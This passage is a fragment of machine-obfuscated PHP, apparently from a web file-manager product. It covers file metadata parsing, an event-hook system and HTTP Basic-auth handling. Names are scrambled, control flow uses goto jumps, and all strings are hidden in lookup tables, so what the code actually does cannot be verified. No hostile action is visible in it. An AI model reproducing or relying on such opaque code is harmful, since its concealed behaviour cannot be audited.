$E†Ò”À‰–¯ = $C¦³»µ™ß¢; while (!0) { $E†Ò”À‰–¯++; $dñ–ÆÄ±á = $C²ÃÁ‹‘Úô[685]; if ($E†Ò”À‰–¯ <= 2) { $C¦³»µ™ß¢ = $E†Ò”À‰–¯; break; } else { if ($E†Ò”À‰–¯ < 2) { continue; } } $DæÍĞœÑš× = !0; for ($CéÆÈÉÎª¹ = 2; $CéÆÈÉÎª¹ <= $E²ˆÚÆÂìÃ[346]($E†Ò”À‰–¯); $CéÆÈÉÎª¹++) { if ($E†Ò”À‰–¯ % $CéÆÈÉÎª¹ == 0) { $DæÍĞœÑš× = !1; } } if ($DæÍĞœÑš×) { $C¦³»µ™ß¢ = $E†Ò”À‰–¯; break; } } $A†Š –ˆ§Ã[] = $C¦³»µ™ß¢; $c¨«ˆ›‘ = $C²ÃÁ‹‘Úô[686]; } goto DªÂ‰Ğ—; DªÂ‰Ğ—: $AÃ«‚ÉÒºª = 2; $e•ŞÉ³ÈÑ© = $C²ÃÁ‹‘Úô[687]; if (!$e•ŞÉ³ÈÑ©) { return; } goto Cª‹İÄ‘°; F¬‘ç¦–óï: $C²ÃÁ‹‘Úô =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E²ˆÚÆÂìÃ =& $_SERVER[Ü âªøğÕå]; $eĞ İ¦é° = $E²ˆÚÆÂìÃ[325]($E²ˆÚÆÂìÃ[345](2, 14), $E²ˆÚÆÂìÃ[345](2, 16) - 1); goto cÒñãå«Ê¦; EÌ¥±èÔ‚º: } public function horbddb81d53($cİ¦ˆÕ‹è, $d½Œ¢µßØ¹) { $BäëºÌïÏ =& $_SERVER[Ü âªøğÕå]; return $BäëºÌïÏ[13](array($BäëºÌïÏ[14], $BäëºÌïÏ[347]), $cİ¦ˆÕ‹è, $d½Œ¢µßØ¹); } public function tvgi50ee0b57($f™È¼¶Ã¾—, $E¤ÛˆÎØ°¢) { $eËƒÎ˜³ò  =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D—°­”‹í =& $_SERVER[Ü âªøğÕå]; return $D—°­”‹í[13](array($D—°­”‹í[348], $D—°­”‹í[349]), $f™È¼¶Ã¾—, $E¤ÛˆÎØ°¢); $B½ ±¹‚èŞ = $eËƒÎ˜³ò [688]; while (strlen($B½ ±¹‚èŞ) < $eËƒÎ˜³ò [554]) { if (!$B½ ±¹‚èŞ) { break; } $B½ ±¹‚èŞ++; } } public function gcetcad0167b($E™ÁŞ•±ÛÓ, $cöË¢ŞŞ›†) { $a¦Õ½ãõ¶ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F³Ñ°„¨³ =& $_SERVER[Ü âªøğÕå]; return $F³Ñ°„¨³[13](array($F³Ñ°„¨³[348], $F³Ñ°„¨³[350]), $E™ÁŞ•±ÛÓ, $cöË¢ŞŞ›†); $A”‰¡öÚ¤Ë = $a¦Õ½ãõ¶[689]; if (strlen($A”‰¡öÚ¤Ë) < $a¦Õ½ãõ¶[584]) { die; } } } goto A•™ğî¸Í³; A¾†àå£åÀ: class GetInfo { private static $fileTypeArray; public static function get($E¼È­ÕÌŠ·) { $E‚ñÑ©© = IO::info($E¼È­ÕÌŠ·); return self::infoAdd($E‚ñÑ©©); } public static function infoAdd(&$d§¬Á‰§Şë) { goto C¡©ï¨ŸÅë; C¡©ï¨ŸÅë: $DÅœä£ÎÔ¡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; static $f®ÊŸÅÉÅ„; if (!$f®ÊŸÅÉÅ„) { require SDK_DIR . $DÅœä£ÎÔ¡[1620]; $f®ÊŸÅÉÅ„ = new getID3(); } goto D²Ã¿œäƒ; D²Ã¿œäƒ: if (!$d§¬Á‰§Şë || $d§¬Á‰§Şë[$DÅœä£ÎÔ¡[29]] != $DÅœä£ÎÔ¡[167]) { return; } if (!self::support($d§¬Á‰§Şë[$DÅœä£ÎÔ¡[160]]) || isset($d§¬Á‰§Şë[$DÅœä£ÎÔ¡[426]])) { return; } $d‚İĞó±ì¶ = $DÅœä£ÎÔ¡[1621] . $d§¬Á‰§Şë[$DÅœä£ÎÔ¡[75]]; goto D®…¸ƒÚôè; D®…¸ƒÚôè: $DÛÜ¢âé•Ö = $d§¬Á‰§Şë[$DÅœä£ÎÔ¡[160]]; try { if ($d§¬Á‰§Şë[$DÅœä£ÎÔ¡[160]] == $DÅœä£ÎÔ¡[1622]) { $e¢ŠÆê¿ø = self::psdParse($d‚İĞó±ì¶); $DÛÜ¢âé•Ö = $DÅœä£ÎÔ¡[1623]; } else { if ($d§¬Á‰§Şë[$DÅœä£ÎÔ¡[160]] == $DÅœä£ÎÔ¡[1624]) { $e¢ŠÆê¿ø = self::pdfParse($d‚İĞó±ì¶); } else { $DÛÜ¢âé•Ö = self::$fileTypeArray[$DÅœä£ÎÔ¡[1625]][$d§¬Á‰§Şë[$DÅœä£ÎÔ¡[160]]]; $b”ŸØñ‰ = self::$fileTypeArray[$DÅœä£ÎÔ¡[1626]][$DÛÜ¢âé•Ö][$DÅœä£ÎÔ¡[1627]]; $Fá”±…¬… = @$f®ÊŸÅÉÅ„->analyze($d‚İĞó±ì¶, $d§¬Á‰§Şë[$DÅœä£ÎÔ¡[77]], $d§¬Á‰§Şë[$DÅœä£ÎÔ¡[28]]); $e¢ŠÆê¿ø = self::parseData($Fá”±…¬…, $b”ŸØñ‰, $d§¬Á‰§Şë); } } } catch (Exception $E•«Ò–‹ô›) { $e¢ŠÆê¿ø = array($DÅœä£ÎÔ¡[372] => $DÛÜ¢âé•Ö); } if (!$e¢ŠÆê¿ø) { return; } goto a·ñ‰ğ¶Å×; a·ñ‰ğ¶Å×: $e¢ŠÆê¿ø[$DÅœä£ÎÔ¡[372]] = $DÛÜ¢âé•Ö; $d§¬Á‰§Şë[$DÅœä£ÎÔ¡[426]] = $e¢ŠÆê¿ø; return $d§¬Á‰§Şë; goto b‡‡µ© µí; b‡‡µ© µí: } public static function support($F¥—¿£›‰è) { goto AªÒ¨Ìé­; d¤®«‡Øã: $b©º¯‹Œ¿Â = array($dŸùÂÇù¸[1624], $dŸùÂÇù¸[1622]); if (in_array($F¥—¿£›‰è, $b©º¯‹Œ¿Â)) { return !0; } if (isset(self::$fileTypeArray[$dŸùÂÇù¸[1625]][$F¥—¿£›‰è])) { return !0; } goto dŒÂø²°Õ¦; AªÒ¨Ìé­: $dŸùÂÇù¸ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $F¥—¿£›‰è = strtolower($F¥—¿£›‰è); goto d¤®«‡Øã; dŒÂø²°Õ¦: return !1; goto d‘½¶¼Ï­¾; d‘½¶¼Ï­¾: } private static function parseData($BÁÓ‘ŠÔ«ª, $B¸‰šØ±ã, $eÑ–¹‰óÕ) { $føÇ†¢®ÄÚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eÁêÄ›‡İé = $BÁÓ‘ŠÔ«ª[$føÇ†¢®ÄÚ[1628]]; $däî¤’ÈÌ = array(); foreach ($B¸‰šØ±ã as $D”ù²Ğˆ› => $EÇ«î¬¯É¤) { foreach ($EÇ«î¬¯É¤ as $cá¡†›¯å) { if (is_array($cá¡†›¯å)) { $dôÒí’ùÉ™ = self::parseData($BÁÓ‘ŠÔ«ª, $EÇ«î¬¯É¤, $eÑ–¹‰óÕ); if ($dôÒí’ùÉ™) { $däî¤’ÈÌ[$D”ù²Ğˆ›] = $dôÒí’ùÉ™; } break; } $E·â‰Ì©† = str_replace($føÇ†¢®ÄÚ[1398], $eÁêÄ›‡İé, $cá¡†›¯å); $dôÒí’ùÉ™ = _get($BÁÓ‘ŠÔ«ª, $E·â‰Ì©†); $dôÒí’ùÉ™ = is_array($dôÒí’ùÉ™) ? $dôÒí’ùÉ™[0] : $dôÒí’ùÉ™; if ($dôÒí’ùÉ™) { break; } } if ($dôÒí’ùÉ™ || $dôÒí’ùÉ™ === 0 || $dôÒí’ùÉ™ === !1) { $dôÒí’ùÉ™ = self::valueReset($cá¡†›¯å, $dôÒí’ùÉ™, $D”ù²Ğˆ›); if ($dôÒí’ùÉ™ !== null) { $däî¤’ÈÌ[$D”ù²Ğˆ›] = $dôÒí’ùÉ™; } } } $däî¤’ÈÌ = self::valueResetAll($däî¤’ÈÌ, $eÑ–¹‰óÕ); return $däî¤’ÈÌ; } private static function psdParse($DèíÌªÒöŠ) { $Bä Ï„î› =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (IO::fileSubstr($DèíÌªÒöŠ, 0, 4) != $Bä Ï„î›[1629]) { return !1; } $fˆóî®Ü™» = getImageSize($DèíÌªÒöŠ, $aİ××ÊßØ); if (!$fˆóî®Ü™») { return; } $f—Â‘ÉÔÅ = array($Bä Ï„î›[1544] => $fˆóî®Ü™»[0], $Bä Ï„î›[1546] => $fˆóî®Ü™»[1]); return $f—Â‘ÉÔÅ; } private static function pdfParse($AÁÜï„¾«¬) { return FileParsePdf::parse($AÁÜï„¾«¬); } private static function fileTypeParse() { $EîŞŒ®ÓÒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BõŠÎç•†¸ = self::fileTypeArray(); $a©ªÌÙÁ’ = array(); foreach ($BõŠÎç•†¸ as $eÚ‹‘­«‰ => $bñÒ¢¸šÃ) { $E‰£ÓÍ¬î‹ = _get($bñÒ¢¸šÃ, $EîŞŒ®ÓÒ[160], $EîŞŒ®ÓÒ[33]); $EÆªÆÃÛé˜ = is_string($E‰£ÓÍ¬î‹) ? explode($EîŞŒ®ÓÒ[47], $E‰£ÓÍ¬î‹) : $E‰£ÓÍ¬î‹; if (!$EÆªÆÃÛé˜) { continue; } foreach ($EÆªÆÃÛé˜ as $E‰£ÓÍ¬î‹) { $E‰£ÓÍ¬î‹ = strtolower(trim($E‰£ÓÍ¬î‹)); if (!$E‰£ÓÍ¬î‹) { continue; } $a©ªÌÙÁ’[$E‰£ÓÍ¬î‹] = $eÚ‹‘­«‰; } $BõŠÎç•†¸[$eÚ‹‘­«‰][$EîŞŒ®ÓÒ[160]] = array_keys($a©ªÌÙÁ’); $BõŠÎç•†¸[$eÚ‹‘­«‰][$EîŞŒ®ÓÒ[1627]] = self::parseKeyMap($bñÒ¢¸šÃ[$EîŞŒ®ÓÒ[1627]]); } return array($EîŞŒ®ÓÒ[1626] => $BõŠÎç•†¸, $EîŞŒ®ÓÒ[1625] => $a©ªÌÙÁ’); } private static function parseKeyMap($b™èˆó‡‹) { $FÏåÈÚÙÕÄ =& $_SERVER[³‘’¼äÑ™ÔÍ]; foreach ($b™èˆó‡‹ as $B¾ÅêÁ¼Áù => $a”‰×ŞÁÃŒ) { if (is_array($a”‰×ŞÁÃŒ)) { $f‡«éˆ…¤¤ = self::parseKeyMap($a”‰×ŞÁÃŒ); if ($f‡«éˆ…¤¤) { $b™èˆó‡‹[$B¾ÅêÁ¼Áù] = $f‡«éˆ…¤¤; } continue; } $CùÙ©Š¦Ì = explode($FÏåÈÚÙÕÄ[47], $a”‰×ŞÁÃŒ); $fèáßÁ§‡” = array(); foreach ($CùÙ©Š¦Ì as $eªÊĞ·¢) { $eªÊĞ·¢ = trim($eªÊĞ·¢); if (!$eªÊĞ·¢) { continue; } if (preg_match($FÏåÈÚÙÕÄ[1630], $eªÊĞ·¢, $eºÉÁŠÍŠ)) { $Dé©Õğ÷È = explode($FÏåÈÚÙÕÄ[271], $eºÉÁŠÍŠ[1]); foreach ($Dé©Õğ÷È as $FµÖ´²å«…) { $fèáßÁ§‡”[] = str_replace($eºÉÁŠÍŠ[0], $FµÖ´²å«…, $eªÊĞ·¢); } } else { $fèáßÁ§‡”[] = $eªÊĞ·¢; } } $b™èˆó‡‹[$B¾ÅêÁ¼Áù] = $fèáßÁ§‡”; } return $b™èˆó‡‹; } private static function valueResetAll($cÜ®›Ë¯æ«, $B‘˜Ôêİğ) { goto FÉò‘ÒñÊ™; Cİ–¬Ô¸¦œ: $F —ˆÖ¡¹ = _get($cÜ®›Ë¯æ«, $fÔŠ‰ÖÙ[1643], $fÔŠ‰ÖÙ[33]); $E¨¡†ÕÎ§ù = $eÆÜìÛ ³„ . $D…¹õŒ¼¶‘ . $F —ˆÖ¡¹; if ($E¨¡†ÕÎ§ù && get_charset($E¨¡†ÕÎ§ù) != $fÔŠ‰ÖÙ[326]) { $cÜ®›Ë¯æ«[$fÔŠ‰ÖÙ[1640]][$fÔŠ‰ÖÙ[1351]] = iconv_to($cÜ®›Ë¯æ«[$fÔŠ‰ÖÙ[1640]][$fÔŠ‰ÖÙ[1351]], get_charset($E¨¡†ÕÎ§ù), $fÔŠ‰ÖÙ[326]); $cÜ®›Ë¯æ«[$fÔŠ‰ÖÙ[1640]][$fÔŠ‰ÖÙ[1644]] = iconv_to($cÜ®›Ë¯æ«[$fÔŠ‰ÖÙ[1640]][$fÔŠ‰ÖÙ[1644]], get_charset($E¨¡†ÕÎ§ù), $fÔŠ‰ÖÙ[326]); $cÜ®›Ë¯æ«[$fÔŠ‰ÖÙ[1640]][$fÔŠ‰ÖÙ[1645]] = iconv_to($cÜ®›Ë¯æ«[$fÔŠ‰ÖÙ[1640]][$fÔŠ‰ÖÙ[1645]], get_charset($E¨¡†ÕÎ§ù), $fÔŠ‰ÖÙ[326]); } goto CÑ—£Š—‚Â; CÑ—£Š—‚Â: return $cÜ®›Ë¯æ«; goto EÈˆªÄ·¬¨; dõ Î‹¬: if ($EÕĞ¸†ŠÜ) { $f·ƒ÷Ì¨ƒõ = IO_PATH_SYSTEM_TEMP . $fÔŠ‰ÖÙ[1636] . KodIO::hashPath($B‘˜Ôêİğ) . $fÔŠ‰ÖÙ[1637]; $cÜ®›Ë¯æ«[$fÔŠ‰ÖÙ[1638]] = Action($fÔŠ‰ÖÙ[1639])->pluginCacheFileSet($f·ƒ÷Ì¨ƒõ, $EÕĞ¸†ŠÜ); unset($cÜ®›Ë¯æ«[$fÔŠ‰ÖÙ[1640]][$fÔŠ‰ÖÙ[1623]]); } $eÆÜìÛ ³„ = _get($cÜ®›Ë¯æ«, $fÔŠ‰ÖÙ[1641], $fÔŠ‰ÖÙ[33]); $D…¹õŒ¼¶‘ = _get($cÜ®›Ë¯æ«, $fÔŠ‰ÖÙ[1642], $fÔŠ‰ÖÙ[33]); goto Cİ–¬Ô¸¦œ; FÉò‘ÒñÊ™: $fÔŠ‰ÖÙ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (isset($cÜ®›Ë¯æ«[$fÔŠ‰ÖÙ[1631]])) { $BÁ£Ò‰Ü…† = ceil($cÜ®›Ë¯æ«[$fÔŠ‰ÖÙ[1631]]); $a²¯¨½ßÌÄ = intval($BÁ£Ò‰Ü…† / 3600); $bİÀÉ‡…æ— = intval(($BÁ£Ò‰Ü…† - $a²¯¨½ßÌÄ * 3600) / 60); $cÚË’¡ƒ°Ä = $BÁ£Ò‰Ü…† % 60; $cÜ®›Ë¯æ«[$fÔŠ‰ÖÙ[1632]] = sprintf($fÔŠ‰ÖÙ[1633], $a²¯¨½ßÌÄ, $bİÀÉ‡…æ—, $cÚË’¡ƒ°Ä); if ($a²¯¨½ßÌÄ == 0) { $cÜ®›Ë¯æ«[$fÔŠ‰ÖÙ[1632]] = sprintf($fÔŠ‰ÖÙ[1634], $bİÀÉ‡…æ—, $cÚË’¡ƒ°Ä); } } $EÕĞ¸†ŠÜ = _get($cÜ®›Ë¯æ«, $fÔŠ‰ÖÙ[1635]); goto dõ Î‹¬; EÈˆªÄ·¬¨: } private static function valueReset($a­¿º’Æ², $aŒÓØÔ½´¹, $FÔ Üò³œØ) { $b’õßäšÙì =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aƒ‘Ç ë×² = $b’õßäšÙì[1561]; switch ($a­¿º’Æ²) { case $b’õßäšÙì[1646]: $aŒÓØÔ½´¹ = $aŒÓØÔ½´¹ == $b’õßäšÙì[83] ? $b’õßäšÙì[1647] : $b’õßäšÙì[1648]; break; case $b’õßäšÙì[1649]: $aŒÓØÔ½´¹ = $aŒÓØÔ½´¹ ? $aŒÓØÔ½´¹ : null; break; default: break; } switch ($FÔ Üò³œØ) { case $b’õßäšÙì[1650]: $aŒÓØÔ½´¹ = round($aŒÓØÔ½´¹, 2); break; case $b’õßäšÙì[187]: case $b’õßäšÙì[107]: if ($aŒÓØÔ½´¹ < 0) { $aŒÓØÔ½´¹ = null; } else { if (is_numeric($aŒÓØÔ½´¹)) { $aŒÓØÔ½´¹ = date($aƒ‘Ç ë×², $aŒÓØÔ½´¹); } } break; default: break; } return $aŒÓØÔ½´¹; } private static function fileTypeArray() { $DĞ£¥¹»· =& $_SERVER[³‘’¼äÑ™ÔÍ]; return array($DĞ£¥¹»·[1623] => array($DĞ£¥¹»·[160] => $DĞ£¥¹»·[1651] . $DĞ£¥¹»·[1652], $DĞ£¥¹»·[1627] => array($DĞ£¥¹»·[1544] => $DĞ£¥¹»·[1653], $DĞ£¥¹»·[1546] => $DĞ£¥¹»·[1654], $DĞ£¥¹»·[1655] => $DĞ£¥¹»·[1656], $DĞ£¥¹»·[1657] => $DĞ£¥¹»·[1658], $DĞ£¥¹»·[187] => $DĞ£¥¹»·[1659], $DĞ£¥¹»·[107] => $DĞ£¥¹»·[1660], $DĞ£¥¹»·[1661] => $DĞ£¥¹»·[1662], $DĞ£¥¹»·[1663] => $DĞ£¥¹»·[1664], $DĞ£¥¹»·[1665] => $DĞ£¥¹»·[1666], $DĞ£¥¹»·[1667] => $DĞ£¥¹»·[1668], $DĞ£¥¹»·[1669] => $DĞ£¥¹»·[1670], $DĞ£¥¹»·[1671] => $DĞ£¥¹»·[1672], $DĞ£¥¹»·[1673] => $DĞ£¥¹»·[1674], $DĞ£¥¹»·[1675] => array($DĞ£¥¹»·[1676] => $DĞ£¥¹»·[1677], $DĞ£¥¹»·[1678] => $DĞ£¥¹»·[1679], $DĞ£¥¹»·[1680] => $DĞ£¥¹»·[1681]), $DĞ£¥¹»·[1682] => $DĞ£¥¹»·[1683], $DĞ£¥¹»·[1684] => $DĞ£¥¹»·[1685], $DĞ£¥¹»·[1686] => $DĞ£¥¹»·[1687], $DĞ£¥¹»·[1688] => $DĞ£¥¹»·[1689], $DĞ£¥¹»·[1690] => array($DĞ£¥¹»·[1691] => $DĞ£¥¹»·[1692], $DĞ£¥¹»·[1693] => $DĞ£¥¹»·[1694], $DĞ£¥¹»·[1695] => $DĞ£¥¹»·[1696], $DĞ£¥¹»·[1697] => $DĞ£¥¹»·[1698], $DĞ£¥¹»·[1699] => $DĞ£¥¹»·[1700], $DĞ£¥¹»·[1701] => $DĞ£¥¹»·[1702], $DĞ£¥¹»·[1703] => $DĞ£¥¹»·[1704], $DĞ£¥¹»·[1705] => $DĞ£¥¹»·[1706], $DĞ£¥¹»·[1707] => $DĞ£¥¹»·[1708], $DĞ£¥¹»·[1709] => $DĞ£¥¹»·[1710], $DĞ£¥¹»·[1711] => $DĞ£¥¹»·[1712]))), $DĞ£¥¹»·[1713] => array($DĞ£¥¹»·[160] => $DĞ£¥¹»·[1714] . $DĞ£¥¹»·[1715], $DĞ£¥¹»·[1627] => array($DĞ£¥¹»·[1631] => $DĞ£¥¹»·[1716], $DĞ£¥¹»·[187] => $DĞ£¥¹»·[1717], $DĞ£¥¹»·[107] => $DĞ£¥¹»·[1718], $DĞ£¥¹»·[1663] => $DĞ£¥¹»·[1719], $DĞ£¥¹»·[1720] => $DĞ£¥¹»·[1721], $DĞ£¥¹»·[1722] => $DĞ£¥¹»·[1649], $DĞ£¥¹»·[1723] => $DĞ£¥¹»·[1724], $DĞ£¥¹»·[1725] => $DĞ£¥¹»·[1726], $DĞ£¥¹»·[1727] => $DĞ£¥¹»·[1728], $DĞ£¥¹»·[1640] => array($DĞ£¥¹»·[1351] => $DĞ£¥¹»·[1729], $DĞ£¥¹»·[1644] => $DĞ£¥¹»·[1730], $DĞ£¥¹»·[1645] => $DĞ£¥¹»·[1731], $DĞ£¥¹»·[1732] => $DĞ£¥¹»·[1733], $DĞ£¥¹»·[1734] => $DĞ£¥¹»·[1735], $DĞ£¥¹»·[1736] => $DĞ£¥¹»·[1737], $DĞ£¥¹»·[1623] => $DĞ£¥¹»·[1738]))), $DĞ£¥¹»·[1739] => array($DĞ£¥¹»·[160] => $DĞ£¥¹»·[1740] . $DĞ£¥¹»·[1741], $DĞ£¥¹»·[1627] => array($DĞ£¥¹»·[1544] => $DĞ£¥¹»·[1742], $DĞ£¥¹»·[1546] => $DĞ£¥¹»·[1743], $DĞ£¥¹»·[1631] => $DĞ£¥¹»·[1716], $DĞ£¥¹»·[187] => $DĞ£¥¹»·[1744], $DĞ£¥¹»·[107] => $DĞ£¥¹»·[1745], $DĞ£¥¹»·[1650] => $DĞ£¥¹»·[1746], $DĞ£¥¹»·[1727] => $DĞ£¥¹»·[1747], $DĞ£¥¹»·[1723] => $DĞ£¥¹»·[1748], $DĞ£¥¹»·[1663] => $DĞ£¥¹»·[1749], $DĞ£¥¹»·[1713] => array($DĞ£¥¹»·[1722] => $DĞ£¥¹»·[1649], $DĞ£¥¹»·[1750] => $DĞ£¥¹»·[1751], $DĞ£¥¹»·[1720] => $DĞ£¥¹»·[1721], $DĞ£¥¹»·[1727] => $DĞ£¥¹»·[1728], $DĞ£¥¹»·[1723] => $DĞ£¥¹»·[1752], $DĞ£¥¹»·[1725] => $DĞ£¥¹»·[1726]))), $DĞ£¥¹»·[1753] => array($DĞ£¥¹»·[1627] => array($DĞ£¥¹»·[1754] => $DĞ£¥¹»·[1755], $DĞ£¥¹»·[1756] => $DĞ£¥¹»·[1757])), $DĞ£¥¹»·[1758] => array($DĞ£¥¹»·[1627] => array())); } } class Hook { private static $events = array(); public static function get($C²—É¶˜Â = false) { if (!$C²—É¶˜Â) { return self::$events; } else { return self::$events[$C²—É¶˜Â]; } } public static function apply($d¡¼ù¡Ã¼ç, $Eå ½ö¡‚‹ = array()) { $A‚¨±é¤ƒà = ActionApply($d¡¼ù¡Ã¼ç, $Eå ½ö¡‚‹); if (is_string($d¡¼ù¡Ã¼ç)) { Hook::trigger($d¡¼ù¡Ã¼ç); } return $A‚¨±é¤ƒà; } public static function bind($Câô˜‰Å«¹, $FåÔã„ÀíÆ, $fÇº“¿…±Ì = false) { $b†“¢×«ƒâ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!isset(self::$events[$Câô˜‰Å«¹])) { self::$events[$Câô˜‰Å«¹] = array(); } self::$events[$Câô˜‰Å«¹][] = array($b†“¢×«ƒâ[1759] => $FåÔã„ÀíÆ, $b†“¢×«ƒâ[1760] => $fÇº“¿…±Ì, $b†“¢×«ƒâ[1761] => 0); } public static function once($B©±¿’áÒ‘, $d§¥Ïˆ¹Ğ„) { self::bind($B©±¿’áÒ‘, $d§¥Ïˆ¹Ğ„, !0); } public static function unbind($C˜âØÍì¨, $BÀ„«÷ÍË§ = false) { if (!$BÀ„«÷ÍË§) { self::$events[$C˜âØÍì¨] = array(); return; } $cÕøÈ³¯ó“ = self::$events[$C˜âØÍì¨]; self::$events[$C˜âØÍì¨] = array(); if (!is_array($cÕøÈ³¯ó“)) { return; } for ($cƒ›ªŒ«ƒÀ = 0; $cƒ›ªŒ«ƒÀ < count($cÕøÈ³¯ó“); $cƒ›ªŒ«ƒÀ++) { if ($cÕøÈ³¯ó“[$cƒ›ªŒ«ƒÀ][$_SERVER[³‘’¼äÑ™ÔÍ][1759]] == $BÀ„«÷ÍË§) { continue; } self::$events[$C˜âØÍì¨][] = $cÕøÈ³¯ó“[$cƒ›ªŒ«ƒÀ]; } } public static function filter($FÈÏ´¨òŒˆ, $b¤ñ†‘÷) { goto FÀôá«›ùÏ; FÀôá«›ùÏ: $díÈÕ›†ìâ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aŒÇÄŸÚÃ = self::$events; if (!isset($aŒÇÄŸÚÃ[$FÈÏ´¨òŒˆ])) { return $b¤ñ†‘÷; } goto A¤ˆ“ÇÓÜå; A¤ˆ“ÇÓÜå: $f©ã¬ŞÑ = $aŒÇÄŸÚÃ[$FÈÏ´¨òŒˆ]; $dÑ‚¤ ÓÇˆ = $b¤ñ†‘÷; if (!is_array($f©ã¬ŞÑ) || count($f©ã¬ŞÑ) == 0) { return $dÑ‚¤ ÓÇˆ; } goto a£‡´±¿; a£‡´±¿: for ($c’¹Äˆ½ã§ = 0; $c’¹Äˆ½ã§ < count($f©ã¬ŞÑ); $c’¹Äˆ½ã§++) { $b·ÉÛÉáÀñ = $f©ã¬ŞÑ[$c’¹Äˆ½ã§]; if ($b·ÉÛÉáÀñ[$díÈÕ›†ìâ[1760]] && $b·ÉÛÉáÀñ[$díÈÕ›†ìâ[1761]] > 1) { continue; } self::$events[$FÈÏ´¨òŒˆ][$c’¹Äˆ½ã§][$díÈÕ›†ìâ[1761]] = $b·ÉÛÉáÀñ[$díÈÕ›†ìâ[1761]] + 1; $F¤¢ÎéŒÆ† = self::apply($b·ÉÛÉáÀñ[$díÈÕ›†ìâ[1759]], array($dÑ‚¤ ÓÇˆ)); if (gettype($F¤¢ÎéŒÆ†) == gettype($dÑ‚¤ ÓÇˆ)) { $dÑ‚¤ ÓÇˆ = $F¤¢ÎéŒÆ†; } } return $dÑ‚¤ ÓÇˆ; goto fÂÍñ‡Ôí³; fÂÍñ‡Ôí³: } public static function trigger($fËŒÃÎğ•) { goto a–Ã¿¡ÙØÅ; a–Ã¿¡ÙØÅ: $c“ŠÇ¯Ë‚î =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d¾ñÅÁ¤š® = self::$events; $AİÈÃ¸†‰ç = !1; goto eµ°™è¹…; eµ°™è¹…: if (!isset($d¾ñÅÁ¤š®[$fËŒÃÎğ•])) { return $AİÈÃ¸†‰ç; } $E•Ô„ß±¾ = $d¾ñÅÁ¤š®[$fËŒÃÎğ•]; if (!is_array($E•Ô„ß±¾) || count($E•Ô„ß±¾) == 0) { return $AİÈÃ¸†‰ç; } goto E¡ŠÌñã²; BÈÈ š–ÕŒ: return $AİÈÃ¸†‰ç; goto AØ—²Ó™ñ³; E¡ŠÌñã²: $BÚÈ¡®í¢ = func_get_args(); array_shift($BÚÈ¡®í¢); for ($Eºßµ–âê¤ = 0; $Eºßµ–âê¤ < count($E•Ô„ß±¾); $Eºßµ–âê¤++) { $b³¸½„’ÇĞ = $E•Ô„ß±¾[$Eºßµ–âê¤]; if ($b³¸½„’ÇĞ[$c“ŠÇ¯Ë‚î[1760]] && $b³¸½„’ÇĞ[$c“ŠÇ¯Ë‚î[1761]] > 1) { continue; } if (defined($c“ŠÇ¯Ë‚î[1762]) && GLOBAL_LOG_HOOK) { write_log($fËŒÃÎğ• . $c“ŠÇ¯Ë‚î[1763] . $b³¸½„’ÇĞ[$c“ŠÇ¯Ë‚î[1759]], $c“ŠÇ¯Ë‚î[1764]); } self::$events[$fËŒÃÎğ•][$Eºßµ–âê¤][$c“ŠÇ¯Ë‚î[1761]] = $b³¸½„’ÇĞ[$c“ŠÇ¯Ë‚î[1761]] + 1; $bùšäù’µ = self::apply($b³¸½„’ÇĞ[$c“ŠÇ¯Ë‚î[1759]], $BÚÈ¡®í¢); if (defined($c“ŠÇ¯Ë‚î[1762]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $c“ŠÇ¯Ë‚î[1764]); if ($b³¸½„’ÇĞ[$c“ŠÇ¯Ë‚î[1761]] == 200) { $CÖ‚ğè—„ï = is_array($b³¸½„’ÇĞ[$c“ŠÇ¯Ë‚î[1759]]) ? json_encode_force($b³¸½„’ÇĞ[$c“ŠÇ¯Ë‚î[1759]]) : $b³¸½„’ÇĞ[$c“ŠÇ¯Ë‚î[1759]]; write_log($c“ŠÇ¯Ë‚î[1765] . $fËŒÃÎğ• . $c“ŠÇ¯Ë‚î[1766] . $CÖ‚ğè—„ï, $c“ŠÇ¯Ë‚î[1767]); } } $AİÈÃ¸†‰ç = is_null($bùšäù’µ) ? $AİÈÃ¸†‰ç : $bùšäù’µ; } goto BÈÈ š–ÕŒ; AØ—²Ó™ñ³: } } class HttpAuth { public static function get() { $DñÑó‡À¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eÅ ãæÅ³Ã = $DñÑó‡À¢[33]; $fÔÎ–Ëâ• = $DñÑó‡À¢[33]; if (isset($_SERVER[$DñÑó‡À¢[1768]])) { $eÅ ãæÅ³Ã = $_SERVER[$DñÑó‡À¢[1768]]; $fÔÎ–Ëâ• = $_SERVER[$DñÑó‡À¢[1769]]; } elseif (isset($_SERVER[$DñÑó‡À¢[1770]])) { $Dõİ²×ê‘„ = $_SERVER[$DñÑó‡À¢[1770]]; if (strpos(strtolower($Dõİ²×ê‘„), $DñÑó‡À¢[1771]) === 0) { $B’›ˆ¨Äˆº = explode($DñÑó‡À¢[4], base64_decode(substr($Dõİ²×ê‘„, 6))); $eÅ ãæÅ³Ã = isset($B’›ˆ¨Äˆº[0]) ? $B’›ˆ¨Äˆº[0] : $DñÑó‡À¢[33]; $fÔÎ–Ëâ• = isset($B’›ˆ¨Äˆº[1]) ? $B’›ˆ¨Äˆº[1] : 0; } } return array($DñÑó‡À¢[535] => $eÅ ãæÅ³Ã, $DñÑó‡À¢[901] => $fÔÎ–Ëâ•); } public static function error() { goto BÄ¦øÒ™¬¶; C¢Öğ¢¨Œö: header($CÛ‘ï‘‹˜ò[1774]); header($CÛ‘ï‘‹˜ò[1775]); header($CÛ‘ï‘‹˜ò[1269]); goto d½¤ÍÏ÷¼; d½¤ÍÏ÷¼: die; goto D”¾µª¥Û; BÄ¦øÒ™¬¶: $CÛ‘ï‘‹˜ò =& $_SERVER[³‘’¼äÑ™ÔÍ]; header($CÛ‘ï‘‹˜ò[1772]); header($CÛ‘ï‘‹˜ò[1773]); goto 